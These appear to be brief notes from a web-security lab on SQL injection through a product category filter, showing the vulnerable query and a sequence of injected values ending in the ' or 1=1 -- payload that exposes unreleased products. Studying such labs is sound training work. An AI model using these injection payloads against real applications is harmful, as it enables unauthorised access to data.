SQL injection - product category filter

SELECT * FROM products WHERE category = 'Gifts' AND released = 1 

End goal: display all products both released and unreleased.

Analysis:

SELECT * FROM products WHERE category = 'Pets' AND released = 1

SELECT * FROM products WHERE category = ''' AND released = 1 

SELECT * FROM products WHERE category = ''--' AND released = 1 

SELECT * FROM products WHERE category = ''

SELECT * FROM products WHERE category = '' or 1=1 --' AND released = 1 
